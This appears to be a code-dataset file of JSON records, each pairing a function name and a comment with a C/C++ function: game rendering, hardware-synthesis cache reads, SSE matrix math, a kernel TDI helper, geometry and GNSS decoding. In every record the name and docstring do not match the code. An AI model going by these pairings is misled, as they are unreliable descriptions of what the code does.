{"content":"{'function_name': 'FloatRand', 'docstring': '\/\/\\tOutputDebugString(temp);\\r', 'code': 'void RB_RenderWorldEffects(void)\\r\\n{\\r\\n\\tfloat\\t\\t\\t\\t\\telapseTime = backEnd.refdef.frametime \/ 1000.0;\\r\\n\\r\\n\\tif (tr.refdef.rdflags & RDF_NOWORLDMODEL || !tr.world || CL_IsRunningInGameCinematic()) \\r\\n\\t{\\t\/\/  no world rendering or no world\\r\\n\\t\\treturn;\\r\\n\\t}\\r\\n\\r\\n\\tSetViewportAndScissor();\\r\\n\\tqglMatrixMode(GL_MODELVIEW);\\r\\n\/\/\\tqglPushMatrix();\\r\\n\\tqglLoadMatrixf( backEnd.viewParms.world.modelMatrix );\\r\\n\\r\\n\\toriginContents = ri.CM_PointContents(backEnd.viewParms.orient.origin, 0);\\r\\n\\r\\n\\tif (rainSystem)\\r\\n\\t{\\r\\n\\t\\trainSystem->Update(elapseTime);\\r\\n\\t\\trainSystem->Render();\\r\\n\\t}\\r\\n\\r\\n\\tif (snowSystem)\\r\\n\\t{\\r\\n\\t\\tsnowSystem->Update(elapseTime);\\r\\n\\t\\tsnowSystem->Render();\\r\\n\\t}\\r\\n\\r\\n\/\/\\tqglMatrixMode(GL_MODELVIEW);\\r\\n\/\/\\tqglPopMatrix();\\r\\n}'}","id":4367}
{"content":"{'function_name': 'denoiseb_rd42_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd43_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd43 read pattern: { denoiseb_update_0[d0, d1] -> raw[2 + 2d0, 1 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 965 : -1 <= d0 <= 960 and -1 <= d1 <= 1082; denoiseb_update_0[d0, d1] -> (4 + d0) : d0 = 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_965();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":4370}
{"content":"{'function_name': 'rand64', 'docstring': '\/\/todo: borken\\r', 'code': 'm mmult_sse_test(const m* m0_, const m* m1_)\\r\\n{\\r\\n\\tm r;\\r\\n\\t__m128* p0 = (__m128*)m0_;\\r\\n\\t__m128* p1 = (__m128*)m1_;\\r\\n\\tm m0 = *m0_;\\r\\n\\tm m1 = *m1_;\\r\\n\\t__m128 m0_x = _mm_loadu_ps((float*)&p0[0]);\\r\\n\\t__m128 m0_y = _mm_loadu_ps((float*)&p0[1]);\\r\\n\\t__m128 m0_z = _mm_loadu_ps((float*)&p0[2]);\\r\\n\\t__m128 m0_w = _mm_loadu_ps((float*)&p0[3]);\\r\\n\\t__m128 m1_x = _mm_loadu_ps((float*)&p1[0]);\\r\\n\\t__m128 m1_y = _mm_loadu_ps((float*)&p1[1]);\\r\\n\\t__m128 m1_z = _mm_loadu_ps((float*)&p1[2]);\\r\\n\\t__m128 m1_w = _mm_loadu_ps((float*)&p1[3]);\\r\\n\\t__m128 rx = _mm_mul_ps(m0_x, _mm_shuffle_ps(m1_x, m1_x, 0));\\r\\n\\trx = _mm_add_ps(rx, _mm_mul_ps(m0_y, _mm_shuffle_ps(m1_x,m1_x, 0x55)));\\r\\n\\trx = _mm_add_ps(rx, _mm_mul_ps(m0_z, _mm_shuffle_ps(m1_x, m1_x, 0xaa)));\\r\\n\\trx = _mm_add_ps(rx, _mm_mul_ps(m0_w, _mm_shuffle_ps(m1_x, m1_x, 0xff)));\\r\\n\\tr.x.x = m0.x.x * m1.x.x + m0.y.x * m1.x.y + m0.z.x * m1.x.z + m0.trans.x * m1.x.w;\\r\\n\\tr.x.y = m0.x.y * m1.x.x + m0.y.y * m1.x.y + m0.z.y * m1.x.z + m0.trans.y * m1.x.w;\\r\\n\\tr.x.z = m0.x.z * m1.x.x + m0.y.z * m1.x.y + m0.z.z * m1.x.z + m0.trans.z * m1.x.w;\\r\\n\\tr.x.w = m0.x.w * m1.x.x + m0.y.w * m1.x.y + m0.z.w * m1.x.z + m0.trans.w * m1.x.w;\\r\\n\\r\\n\\t__m128 ry = _mm_mul_ps(m0_x, _mm_shuffle_ps(m1_y, m1_y, 0));\\r\\n\\try = _mm_add_ps(ry, _mm_mul_ps(m0_y, _mm_shuffle_ps(m1_y,m1_y, 0x55)));\\r\\n\\try = _mm_add_ps(ry, _mm_mul_ps(m0_z, _mm_shuffle_ps(m1_y, m1_y, 0xaa)));\\r\\n\\try = _mm_add_ps(ry, _mm_mul_ps(m0_w, _mm_shuffle_ps(m1_y, m1_y, 0xff)));\\r\\n\\r\\n\\r\\n\\tr.y.x = m0.x.x * m1.y.x + m0.y.x * m1.y.y + m0.z.x * m1.y.z + m0.trans.x * m1.y.w;\\r\\n\\tr.y.y = m0.x.y * m1.y.x + m0.y.y * m1.y.y + m0.z.y * m1.y.z + m0.trans.y * m1.y.w;\\r\\n\\tr.y.z = m0.x.z * m1.y.x + m0.y.z * m1.y.y + m0.z.z * m1.y.z + m0.trans.z * m1.y.w;\\r\\n\\tr.y.w = m0.x.w * m1.y.x + m0.y.w * m1.y.y + m0.z.w * m1.y.z + m0.trans.w * m1.y.w;\\r\\n\\r\\n\\r\\n\\t__m128 rz = _mm_mul_ps(m0_x, _mm_shuffle_ps(m1_z, m1_z, 0));\\r\\n\\trz = _mm_add_ps(rz, _mm_mul_ps(m0_y, _mm_shuffle_ps(m1_z,m1_z, 0x55)));\\r\\n\\trz = _mm_add_ps(rz, _mm_mul_ps(m0_z, _mm_shuffle_ps(m1_z, m1_z, 0xaa)));\\r\\n\\trz = _mm_add_ps(rz, _mm_mul_ps(m0_w, _mm_shuffle_ps(m1_z, m1_z, 0xff)));\\r\\n\\r\\n\\r\\n\\r\\n\\tr.z.x = m0.x.x * m1.z.x + m0.y.x * m1.z.y + m0.z.x * m1.z.z + m0.trans.x * m1.z.w;\\r\\n\\tr.z.y = m0.x.y * m1.z.x + m0.y.y * m1.z.y + m0.z.y * m1.z.z + m0.trans.y * m1.z.w;\\r\\n\\tr.z.z = m0.x.z * m1.z.x + m0.y.z * m1.z.y + m0.z.z * m1.z.z + m0.trans.z * m1.z.w;\\r\\n\\tr.z.w = m0.x.w * m1.z.x + m0.y.w * m1.z.y + m0.z.w * m1.z.z + m0.trans.w * m1.z.w;\\r\\n\\r\\n\\t__m128 rw = _mm_mul_ps(m0_x, _mm_shuffle_ps(m1_w, m1_w, 0));\\r\\n\\trw = _mm_add_ps(rw, _mm_mul_ps(m0_y, _mm_shuffle_ps(m1_w,m1_w, 0x55)));\\r\\n\\trw = _mm_add_ps(rw, _mm_mul_ps(m0_z, _mm_shuffle_ps(m1_w, m1_w, 0xaa)));\\r\\n\\trw = _mm_add_ps(rw, _mm_mul_ps(m0_w, _mm_shuffle_ps(m1_w, m1_w, 0xff)));\\r\\n\\r\\n\\r\\n\\r\\n\\tr.trans.x = m0.x.x * m1.trans.x + m0.y.x * m1.trans.y + m0.z.x * m1.trans.z + m0.trans.x * m1.trans.w;\\r\\n\\tr.trans.y = m0.x.y * m1.trans.x + m0.y.y * m1.trans.y + m0.z.y * m1.trans.z + m0.trans.y * m1.trans.w;\\r\\n\\tr.trans.z = m0.x.z * m1.trans.x + m0.y.z * m1.trans.y + m0.z.z * m1.trans.z + m0.trans.z * m1.trans.w;\\r\\n\\tr.trans.w = m0.x.w * m1.trans.x + m0.y.w * m1.trans.y + m0.z.w * m1.trans.z + m0.trans.w * m1.trans.w;\\r\\n\\r\\n\\r\\n\\t\/\/ r.x.x = m0.x.x * m1.x.x + m0.x.y * m1.y.x + m0.x.z * m1.z.x + m0.x.w * m1.w.x; \\r\\n\\t\/\/ r.x.y = m0.x.x * m1.x.y + m0.x.y * m1.y.y + m0.x.z * m1.z.y + m0.x.w * m1.w.y; \\r\\n\\t\/\/ r.x.z = m0.x.x * m1.x.z + m0.x.y * m1.y.z + m0.x.z * m1.z.z + m0.x.w * m1.w.z; \\r\\n\\t\/\/ r.x.w = m0.x.x * m1.x.w + m0.x.y * m1.y.w + m0.x.z * m1.z.w + m0.x.w * m1.w.w; \\r\\n\\r\\n\\t\/\/ r.y.x = m0.y.x * m1.x.x + m0.y.y * m1.y.x + m0.y.z * m1.z.x + m0.y.w * m1.w.x; \\r\\n\\t\/\/ r.y.y = m0.y.x * m1.x.y + m0.y.y * m1.y.y + m0.y.z * m1.z.y + m0.y.w * m1.w.y; \\r\\n\\t\/\/ r.y.z = m0.y.x * m1.x.z + m0.y.y * m1.y.z + m0.y.z * m1.z.z + m0.y.w * m1.w.z; \\r\\n\\t\/\/ r.y.w = m0.y.x * m1.x.w + m0.y.y * m1.y.w + m0.y.z * m1.z.w + m0.y.w * m1.w.w; \\r\\n\\r\\n\\t\/\/ r.z.x = m0.z.x * m1.x.x + m0.z.y * m1.y.x + m0.z.z * m1.z.x + m0.z.w * m1.w.x; \\r\\n\\t\/\/ r.z.y = m0.z.x * m1.x.y + m0.z.y * m1.y.y + m0.z.z * m1.z.y + m0.z.w * m1.w.y; \\r\\n\\t\/\/ r.z.z = m0.z.x * m1.x.z + m0.z.y * m1.y.z + m0.z.z * m1.z.z + m0.z.w * m1.w.z; \\r\\n\\t\/\/ r.z.w = m0.z.x * m1.x.w + m0.z.y * m1.y.w + m0.z.z * m1.z.w + m0.z.w * m1.w.w; \\r\\n\\r\\n\\t\/\/ r.w.x = m0.w.x * m1.x.x + m0.w.y * m1.y.x + m0.w.z * m1.z.x + m0.w.w * m1.w.x; \\r\\n\\t\/\/ r.w.y = m0.w.x * m1.x.y + m0.w.y * m1.y.y + m0.w.z * m1.z.y + m0.w.w * m1.w.y; \\r\\n\\t\/\/ r.w.z = m0.w.x * m1.x.z + m0.w.y * m1.y.z + m0.w.z * m1.z.z + m0.w.w * m1.w.z; \\r\\n\\t\/\/ r.w.w = m0.w.x * m1.x.w + m0.w.y * m1.y.w + m0.w.z * m1.z.w + m0.w.w * m1.w.w;\\r\\n\\tm r1;\\r\\n\\t_mm_storeu_ps((float*)&((__m128*)&r1)[0], rx);\\r\\n\\t_mm_storeu_ps((float*)&((__m128*)&r1)[1], ry);\\r\\n\\t_mm_storeu_ps((float*)&((__m128*)&r1)[2], rz);\\r\\n\\t_mm_storeu_ps((float*)&((__m128*)&r1)[3], rw);\\r\\n\\r\\n\\tZASSERT(0 == memcmp(&r1, &r, sizeof(r)));\\r\\n\/\/\\tuprintf(\"LALA\\\\n\");\\r\\n\\treturn r;\\r\\n}'}","id":4374}
{"content":"{'function_name': 'MimeOleParseRfc822Address', 'docstring': '\/\/ Parse the address\\r', 'code': 'MIMEOLEAPI MimeOleParseRfc822AddressW(\\r\\n                                     DWORD               dwAdrType,\\r\\n                                     LPCWSTR             pwszRfc822Adr,\\r\\n                                     LPADDRESSLIST       pList)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    CMimePropertyContainer cContainer;\\r\\n\\r\\n    \/\/ Parse the address\\r\\n    return cContainer.ParseRfc822W(dwAdrType, pwszRfc822Adr, pList);\\r\\n}'}","id":4375}
{"content":"{'function_name': 'setup', 'docstring': '\/\/ make the pins outputs:', 'code': \"bool getSerialCommand(String &readString, int timeoutVal = 200) \/\/Note that readString is passed by reference!\\n{\\n  unsigned long timeout = millis();\\n  while ((millis() - timeout) < timeoutVal) \/\/Wait for TIMEOUT to detect if we didn't get any commands (this is useful to keep your robot from running away if you go out of range!)\\n  {\\n    if (Serial.available() > 0)\\n    {\\n      char c = Serial.read();  \/\/gets one byte from serial buffer\\n      if (c == '\\\\n' || c == '\\\\r' || c == ';') \/\/If we get a newline, or a semicolon, process this command\\n      {\\n        return true; \/\/note that the command will NOT have the ';' character at the end!\\n      }\\n      readString += c; \/\/makes the string readString\\n    }\\n  }\\n  return false; \/\/timed out, no command here\\n}\"}","id":4377}
{"content":"{'function_name': 'was_order_received', 'docstring': '\/\/ throw?', 'code': 'inline bool is_order_complete(OrderStatus order_status) {\\n  switch (order_status) {\\n    case OrderStatus::UNDEFINED:\\n      break;\\n    case OrderStatus::SENT:\\n    case OrderStatus::ACCEPTED:\\n    case OrderStatus::SUSPENDED:\\n    case OrderStatus::WORKING:\\n      return false;\\n    case OrderStatus::STOPPED:\\n    case OrderStatus::COMPLETED:\\n    case OrderStatus::EXPIRED:\\n    case OrderStatus::CANCELED:\\n    case OrderStatus::REJECTED:\\n      return true;\\n  }\\n  return true;  \/\/ throw?\\n}'}","id":4382}
{"content":"{'function_name': 'UxOpenTdiConnectionObject', 'docstring': '\/\/', 'code': 'NTSTATUS\\nUxpOpenTdiObjectHelper(\\n    IN PUNICODE_STRING pTransportDeviceName,\\n    IN PVOID pEaBuffer,\\n    IN ULONG EaLength,\\n    OUT PUX_TDI_OBJECT pTdiObject\\n    )\\n{\\n    NTSTATUS status;\\n    IO_STATUS_BLOCK ioStatusBlock;\\n    OBJECT_ATTRIBUTES objectAttributes;\\n\\n    \/\/\\n    \/\/ Sanity check.\\n    \/\/\\n\\n    PAGED_CODE();\\n\\n    \/\/\\n    \/\/ Open the TDI object.\\n    \/\/\\n\\n    InitializeObjectAttributes(\\n        &objectAttributes,                      \/\/ ObjectAttributes\\n        pTransportDeviceName,                   \/\/ ObjectName\\n        OBJ_CASE_INSENSITIVE |                  \/\/ Attributes\\n            UL_KERNEL_HANDLE,\\n        NULL,                                   \/\/ RootHandle\\n        NULL                                    \/\/ SecurityDescriptor\\n        );\\n\\n    UlAttachToSystemProcess();\\n\\n    status = IoCreateFile(\\n                 &pTdiObject->Handle,           \/\/ FileHandle\\n                 GENERIC_READ |                 \/\/ DesiredAccess\\n                    GENERIC_WRITE |\\n                    SYNCHRONIZE,\\n                 &objectAttributes,             \/\/ ObjectAttributes\\n                 &ioStatusBlock,                \/\/ IoStatusBlock\\n                 NULL,                          \/\/ AllocationSize\\n                 0,                             \/\/ FileAttributes\\n                 0,                             \/\/ ShareAccess\\n                 0,                             \/\/ Disposition\\n                 0,                             \/\/ CreateOptions\\n                 pEaBuffer,                     \/\/ EaBuffer\\n                 EaLength,                      \/\/ EaLength\\n                 CreateFileTypeNone,            \/\/ CreateFileType\\n                 NULL,                          \/\/ ExtraCreateParameters\\n                 IO_NO_PARAMETER_CHECKING       \/\/ Options\\n                 );\\n\\n    if (NT_SUCCESS(status))\\n    {\\n        \/\/\\n        \/\/ Now that we have an open handle to the transport,\\n        \/\/ reference it so we can get the file & device object\\n        \/\/ pointers.\\n        \/\/\\n\\n        status = ObReferenceObjectByHandle(\\n                     pTdiObject->Handle,                \/\/ Handle\\n                     0,                                 \/\/ DesiredAccess\\n                     *IoFileObjectType,                 \/\/ ObjectType\\n                     KernelMode,                        \/\/ AccessMode\\n                     (PVOID *)&pTdiObject->pFileObject, \/\/ Object\\n                     NULL                               \/\/ HandleInformation\\n                     );\\n\\n        if (NT_SUCCESS(status))\\n        {\\n            \/\/\\n            \/\/ Chase down the appropriate device object for the file\\n            \/\/ object.\\n            \/\/\\n\\n            pTdiObject->pDeviceObject =\\n                IoGetRelatedDeviceObject( pTdiObject->pFileObject );\\n\\n            UlDetachFromSystemProcess();\\n\\n            return status;\\n        }\\n\\n        \/\/\\n        \/\/ The ObReferenceObjectByHandle() failed, so close the handle\\n        \/\/ we managed to open & fail the call.\\n        \/\/\\n\\n        ZwClose( pTdiObject->Handle );\\n    }\\n\\n    UlDetachFromSystemProcess();\\n\\n    RtlZeroMemory(\\n        pTdiObject,\\n        sizeof(*pTdiObject)\\n        );\\n\\n    return status;\\n\\n}'}","id":4384}
{"content":"{'function_name': 'cg_solver_toyexample', 'docstring': '\/\/cout << \"residual = \" << res << endl;', 'code': 'NumericMatrix init_system_matrix_toyexample(NumericVector param, int nx)\\n{\\n    int kx = 0, kml=0, i0=0, i1=0;\\n    int nml = 0;\\n    nml = compute_matrix_dimension_toyexample(nx);\\n    NumericMatrix mle(nml, 3);\\n    \/\/ boundary element\\n    kml = 0;\\n    i0 = 0;\\n    i1 = 0;\\n    mle(kml, 0) = i0;\\n    mle(kml, 1) = i1;\\n    mle(kml, 2) = 1.0;\\n    kml = kml + 1;\\n\\n    i0 = 0;\\n    i1 = 1;\\n    mle(kml, 0) = i0;\\n    mle(kml, 1) = i1;\\n    mle(kml, 2) = 0.0;\\n    kml = kml + 1;\\n\\n    \/\/ central elements\\n    for(kx = 1; kx < (nx - 1); kx++)\\n    {\\n        i0 = kx;\\n        i1 = kx;\\n        mle(kml, 0) = i0;\\n        mle(kml, 1) = i1;\\n        mle(kml, 2) = 2.0;\\n        kml = kml + 1;\\n\\n        i0 = kx;\\n        i1 = kx + 1;\\n        mle(kml, 0) = i0;\\n        mle(kml, 1) = i1;\\n        mle(kml, 2) = -1.0;\\n        kml = kml + 1;\\n\\n        i0 = kx;\\n        i1 = kx - 1;\\n        mle(kml, 0) = i0;\\n        mle(kml, 1) = i1;\\n        mle(kml, 2) = -1.0;\\n        kml = kml + 1;\\n    }\\n\\n    i0 = nx - 1;\\n    i1 = nx - 1;\\n    mle(kml, 0) = i0;\\n    mle(kml, 1) = i1;\\n    mle(kml, 2) = 1.0;\\n    kml = kml + 1;\\n\\n    i0 = nx - 1;\\n    i1 = nx - 2;\\n    mle(kml, 0) = i0;\\n    mle(kml, 1) = i1;\\n    mle(kml, 2) = 0.0;\\n    kml = kml + 1;\\n\\n    return mle;\\n}'}","id":4385}
{"content":"{'function_name': 'checkposCC', 'docstring': '\/\/\u8fd4\u56de\u4e24\u4e2a\u5706\u7684\u516c\u5207\u7ebf\u6570\u91cf', 'code': 'vector<point> getCL(circle k1,point k2,point k3){\\n\\t\/\/\u6cbf\u7740k2->k3\u65b9\u5411\u7ed9\u51fa\uff0c\u76f8\u5207\u7ed9\u51fa\u4e24\u4e2a\\n\\tpoint k=proj(k2,k3,k1.o); double d=k1.r*k1.r-(k-k1.o).abs2();\\n\\tif (sign(d)==-1) return {};\\n\\tpoint del=(k3-k2).unit()*sqrt(max(0.0,d));\\n\\treturn {k-del,k+del};\\n}'}","id":4392}
{"content":"{'function_name': 'number_of_next_location_Generator', 'docstring': '\/\/8th posssible location (i-2,j -1)', 'code': 'stack<knightLocation>  next_location_Generator_for_backtracking(knightLocation presentLocation)\\n{\\n    \\n    n=0;\\n    knightLocation temporyNextLocation;\\n    while (!nextl.empty()) {\\n        nextl.pop();\\n    }\\n    \/\/1st possible location (i - 2,j + 1)\\n    temporyNextLocation.xa = presentLocation.xa - 2;\\n    temporyNextLocation.ya = presentLocation.ya+ 1;\\n    if (temporyNextLocation.xa >= 0 && temporyNextLocation.ya >= 0 && temporyNextLocation.xa <= 7 && temporyNextLocation.ya <= 7 && chessBoard[temporyNextLocation.xa][temporyNextLocation.ya]==-1)\\n    {\\n        nextl.push(temporyNextLocation);\\n    }\\n    \\n    \/\/2nd posssible location (i-1,j +2)\\n    temporyNextLocation.xa = presentLocation.xa - 1;\\n    temporyNextLocation.ya = presentLocation.ya+ 2;\\n    if (temporyNextLocation.xa >= 0 && temporyNextLocation.ya >= 0 && temporyNextLocation.xa <= 7 && temporyNextLocation.ya <= 7 && chessBoard[temporyNextLocation.xa][temporyNextLocation.ya]==-1)\\n    {\\n        nextl.push(temporyNextLocation);\\n    }\\n    \\n    \/\/3rd posssible location (i+1,j +2)\\n    temporyNextLocation.xa = presentLocation.xa + 1;\\n    temporyNextLocation.ya = presentLocation.ya + 2;\\n    if (temporyNextLocation.xa >= 0 && temporyNextLocation.ya >= 0 && temporyNextLocation.xa <= 7 && temporyNextLocation.ya <= 7 && chessBoard[temporyNextLocation.xa][temporyNextLocation.ya]==-1)\\n    {\\n        nextl.push(temporyNextLocation);\\n    }\\n    \\n    \/\/4th posssible location (i+2,j +1)\\n    temporyNextLocation.xa = presentLocation.xa + 2;\\n    temporyNextLocation.ya = presentLocation.ya + 1;\\n    if (temporyNextLocation.xa >= 0 && temporyNextLocation.ya >= 0 && temporyNextLocation.xa <= 7 && temporyNextLocation.ya <= 7 && chessBoard[temporyNextLocation.xa][temporyNextLocation.ya]==-1)\\n    {\\n        nextl.push(temporyNextLocation);\\n    }\\n    \/\/5th posssible location (i+2,j -1)\\n    temporyNextLocation.xa = presentLocation.xa + 2;\\n    temporyNextLocation.ya = presentLocation.ya - 1;\\n    if (temporyNextLocation.xa >= 0 && temporyNextLocation.ya >= 0 && temporyNextLocation.xa <= 7 && temporyNextLocation.ya <= 7 && chessBoard[temporyNextLocation.xa][temporyNextLocation.ya]==-1)\\n    {\\n        nextl.push(temporyNextLocation);\\n    }\\n    \/\/6th posssible location (i+1,j -2)\\n    temporyNextLocation.xa = presentLocation.xa + 1;\\n    temporyNextLocation.ya = presentLocation.ya- 2;\\n    if (temporyNextLocation.xa >= 0 && temporyNextLocation.ya >= 0 && temporyNextLocation.xa <= 7 && temporyNextLocation.ya <= 7 && chessBoard[temporyNextLocation.xa][temporyNextLocation.ya]==-1)\\n    {\\n        nextl.push(temporyNextLocation);\\n    }\\n    \\n    \/\/7th posssible location (i-1,j -2)\\n    temporyNextLocation.xa = presentLocation.xa- 1;\\n    temporyNextLocation.ya = presentLocation.ya- 2;\\n    if (temporyNextLocation.xa >= 0 && temporyNextLocation.ya >= 0 && temporyNextLocation.xa <= 7 && temporyNextLocation.ya <= 7 && chessBoard[temporyNextLocation.xa][temporyNextLocation.ya]==-1)\\n    {\\n        nextl.push(temporyNextLocation);\\n    }\\n    \\n    \/\/8th posssible location (i-2,j -1)\\n    temporyNextLocation.xa = presentLocation.xa- 2;\\n    temporyNextLocation.ya = presentLocation.ya - 1;\\n    if (temporyNextLocation.xa >= 0 && temporyNextLocation.ya >= 0 && temporyNextLocation.xa <= 7 && temporyNextLocation.ya <= 7 && chessBoard[temporyNextLocation.xa][temporyNextLocation.ya]==-1)\\n    {\\n        nextl.push(temporyNextLocation);\\n    }\\n    \\n    return nextl;\\n}'}","id":4393}
{"content":"{'function_name': '__f', 'docstring': '\/\/use cerr if u want to display at the bottom', 'code': 'int maxPossible(string str, int i , int j ) {\\n\\n\\tif(i>j) return 0 ;\\n\\n\\tif(i==j) return 1 ;\\n\\n\\tif(dp[i][j]!=-1)\\n\\t\\treturn dp[i][j];\\n\\n\\tint ans = 0 ;\\n\\tif(str[i]==str[j]){\\n\\t\\tans  = 2 + maxPossible(str,i+1 , j-1 );\\n\\t}\\n\\n\\tdp[i][j] = ans ;\\n\\n\\t\/\/ trace(dp[i][j],i,j);\\n\\treturn dp[i][j];\\n}'}","id":4394}
{"content":"{'function_name': 'demosaic_demosaic_bxb_update_0_read_bundle_read', 'docstring': '\/\/ demosaic_bxb_rd5', 'code': 'inline hw_uint<32> demosaic_demosaic_diff_update_0_read_bundle_read(demosaic_cache& demosaic, int d0, int d1) {\\n  \/\/ # of ports in bundle: 2\\n    \/\/ demosaic_diff_rd0\\n    \/\/ demosaic_diff_rd1\\n\\n\\thw_uint<32> result;\\n\\thw_uint<16> demosaic_diff_rd0_res = demosaic_diff_rd0_select(demosaic, d0, d1);\\n\\tset_at<0, 32>(result, demosaic_diff_rd0_res);\\n\\thw_uint<16> demosaic_diff_rd1_res = demosaic_diff_rd1_select(demosaic, d0, d1);\\n\\tset_at<16, 32>(result, demosaic_diff_rd1_res);\\n\\treturn result;\\n}'}","id":4398}
{"content":"{'function_name': 'getDestroyer', 'docstring': '\/\/Return where the destroyer will be placed.', 'code': 'int getGridSize(void){\\t\/\/Return the size of the grid.\\n\\treturn grid;\\n}'}","id":4400}
{"content":"{'function_name': 'solve', 'docstring': '\/\/printf(\"%d %f %f %f %f %d\\\\n\",x,nowx,nowy,l,r,son[x]);', 'code': 'int main(){\\n    int i,j,k,s,t;\\n    scanf(\"%d\",&n);\\n    for(i=1;i<=n;i++)\\n        a[i].clear();\\n    \/\/for(i=2;i<=n;i++){\\n    \/\/    a[i\/2].push_back(i);\\n    \/\/}\\n    for(i=1;i<=n-1;i++){\\n        scanf(\"%d%d\",&s,&t);\\n        a[s].push_back(t);\\n        a[t].push_back(s);\\n    }\\n    memset(flag,0,sizeof(flag));\\n    memset(son,0,sizeof(son));\\n    dfs(1);\\n    memset(flag,0,sizeof(flag));\\n    \/\/for(i=1;i<=n;i++)printf(\"%d \",son[i]);printf(\"\\\\n\");\\n    seed = chrono::system_clock::now ().time_since_epoch ().count ();\\n    solve(1,0,0,0,2.0*acos(-1.0));\\n    for(i=1;i<=n;i++){\\n        printf(\"%.8Lf %.8Lf\\\\n\",ansx[i],ansy[i]);\\n    }\\n    long double tmp=10;\\n    \/*for(i=1;i<=n;i++)\\n        for(j=i+1;j<=n;j++)\\n            tmp=min(tmp,dis(i,j));\\n    printf(\"%.8Lf\\\\n\",tmp);*\/\\n    return 0;\\n}'}","id":4405}
{"content":"{'function_name': 'GetSelectionRay', 'docstring': '\/\/ \u83b7\u53d6\u8fdc\u88c1\u526a\u9762\u4e0a\u7684\u4ea4\u70b9', 'code': 'bool isCross(LineSegment &l, float x, float y, float z,float size)\\n{\\n\\t\/\/z is defined\\n\\tfloat xNow = (l.Far.x - l.Near.x)*(z- l.Near.z) \/ (l.Far.z - l.Near.z)+l.Near.x;\\n\\tfloat yNow = (l.Far.y - l.Near.y)*( z- l.Near.z) \/ (l.Far.z - l.Near.z) + l.Near.y;\\n\\tif (xNow >= x - size && xNow <= x + size && yNow >= y - size && yNow <= y + size)\\n\\t{\\n\\t\\treturn true;\\n\\t}\\n    return false;\\n}'}","id":4414}
{"content":"{'function_name': 'non_linear_entropy_new', 'docstring': '\/\/E_der = -1.\/( ( std::abs( (1-phi(pt,msh,cl))*phi(pt,msh,cl)  ) +eps )*std::log(10) ) * sgn( (1-phi(pt,msh,cl))*phi(pt,msh,cl)  ) * ( 1 - 2*phi(pt,msh,cl)  ) ;', 'code': 'Matrix<T, Dynamic, Dynamic>\\nmake_lagrange_local_mass_matrix(const Mesh& msh, const typename Mesh::cell_type& cl, size_t degree, size_t di = 0)\\n{\\n    \\n    \/\/auto f_neigh = cl.user_data.f_neighbors;\\n    \/\/auto d_neigh = cl.user_data.d_neighbors;\\n    \\n    cell_basis_Lagrangian<Mesh,T> cb(msh, cl, degree);\\n    auto cbs = cb.size();\\n\\n    Matrix<T, Dynamic, Dynamic> ret = Matrix<T, Dynamic, Dynamic>::Zero(cbs, cbs);\\n    \/\/Matrix<T, Dynamic, 1> ret2 = Matrix<T, Dynamic, 1>::Zero(cbs, 1);\\n\\n    auto qps = integrate(msh, cl, 2*(degree+di)); \/\/ integration of order 2k\\n\\n    for (auto& qp : qps)\\n    {\\n        auto phi = cb.eval_basis(qp.first);\\n        ret += qp.second * phi * phi.transpose();\\n        \/\/ phi * phi.transpose is (degree+1)^2 x (degree+1)^2 ; qp.second is a scalar\\n    }\\n    \/\/ret2  =  ret.rowwise().sum(); \/\/ sum row; i.e. mi0 + mi1 + mi2 + mi3 , with i = 0 : 3\\n    \\n    return ret;\\n}'}","id":4417}
{"content":"{'function_name': 'readimgbuf', 'docstring': '\/* load jpg image file *\/', 'code': 'static int decode_m39_mix(raw_t *raw)\\n{\\n    static int flag=0,j=0,week;\\n    static double ppsp=0.0;\\n    unsigned char *p=raw->buff+4;\\n\\n    uint64_t ts=0,tn=0;\\n    gtime_t time;\\n    double epoch[6],dt;\\n\\n    \/* pps time in tx2-clock *\/\\n    ts=p[0]; ts=ts<<8|p[1]; ts=ts<<8|p[2]; ts=ts<<8|p[3];\\n    tn=p[4]; tn=tn<<8|p[5]; tn=tn<<8|p[6]; tn=tn<<8|p[7];\\n    raw->m39.pps.tv_sec=ts; raw->m39.pps.tv_nsec=tn;\\n\\n    \/* gps nmea time *\/\\n    epoch[0]=p[8 ]; epoch[1]=p[9 ]; epoch[2]=p[10];\\n    epoch[3]=p[11]; epoch[4]=p[12]; epoch[5]=p[13];\\n    epoch[0]+=(CENTURY-1)*100.0;\\n    raw->m39.zda=time=epoch2time(epoch);\\n\\n    time2gpst(time,&week); \/* GPS week *\/\\n\\n    \/* frame time *\/\\n    ts=p[14]; ts=ts<<8|p[15]; ts=ts<<8|p[16]; ts=ts<<8|p[17];\\n    tn=p[18]; tn=tn<<8|p[19]; tn=tn<<8|p[20]; tn=tn<<8|p[21];\\n    raw->m39.fts.tv_sec=ts; raw->m39.fts.tv_nsec=tn;\\n\\n    \/* adjust frame time *\/\\n    if (!flag) {\\n        j=pps2sow(tsp2secs(raw->m39.pps),time2gpst(time,NULL));\\n        raw->m39.sow=time2gpst(time,NULL); \\n        if (j&&raw->m39.sowc++>MINCHGC) flag=1;\\n    }\\n    if (flag) {\\n        if (ppsp!=0.0) {\\n            raw->m39.sow+=ROUND(tsp2secs(raw->m39.pps)-ppsp);\\n        }\\n        ppsp=tsp2secs(raw->m39.pps);\\n\\n        \/* get frame time *\/\\n        dt=tsp2secs(raw->m39.fts)-tsp2secs(raw->m39.pps);\\n        raw->m39.time=gpst2time(week,raw->m39.sow+dt);\\n#if READIMG\\n        \/* read image data *\/\\n        return readimgbuf(raw);\\n#else\\n        return 11;\\n#endif\\n    }\\n    else return 0; \/* fail *\/\\n}'}","id":4435}
